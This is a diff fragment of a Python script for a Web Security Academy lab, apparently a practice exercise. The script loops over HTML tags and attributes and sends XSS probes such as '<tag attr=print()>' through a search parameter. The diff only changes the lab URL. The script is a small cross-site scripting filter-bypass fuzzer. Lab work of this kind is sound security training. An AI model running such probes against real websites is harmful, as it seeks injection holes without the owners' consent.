@@ -10,7 +10,7 @@ tags = {"a","abbr","acronym","address","applet","area","article","aside","audio"
 
 def bruteTagAttribute(tag,attr):
     payload = f"<{tag} {attr}=print()></{tag}>"
-    r = req.get(f"https://0aea004a03777d6a81338abf00940096.web-security-academy.net/?search={payload}")
+    r = req.get(f"https://0ace000303a0e49180ffdf7a00cb0021.web-security-academy.net/?search={payload}")
     if(r.status_code == 200):
         print(payload)
     
